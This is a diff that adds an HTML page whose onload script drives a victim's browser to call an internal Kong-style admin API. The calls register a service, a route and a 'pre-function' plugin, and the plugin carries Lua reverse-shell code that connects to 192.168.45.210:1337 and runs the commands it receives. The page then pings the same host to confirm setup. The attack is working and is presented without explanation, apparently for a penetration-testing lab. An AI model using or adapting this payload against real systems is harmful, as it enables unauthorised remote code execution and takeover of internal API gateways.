@@ -1,0 +1,36 @@
+<html>
+<head>
+<script>
+function createService() {
+	fetch("http://172.16.16.2:8001/services", {
+		method: "post",
+		headers: { "Content-Type": "application/json" },
+		body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
+	}).then(function (route) {
+		createRoute();
+	});
+}
+
+function createRoute() {
+	fetch("http://172.16.16.2:8001/services/supersecret/routes", {
+		method: "post",
+		headers: { "Content-Type": "application/json" }, body: JSON.stringify({"paths": ["/supersecret"]})
+	}).then(function (plugin) {
+		createPlugin();
+	});
+}
+
+function createPlugin() {
+	fetch("http://172.16.16.2:8001/services/supersecret/plugins", {
+		method: "post",
+		headers: { "Content-Type": "application/json" },
+		body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[ "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.210',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" ]}})
+	}).then(function (callback) {
+		fetch("http://192.168.45.210/callback?setupComplete");
+	});
+}
+</script>
+</head>
+<body onload='createService()'> <div></div>
+</body>
+</html>
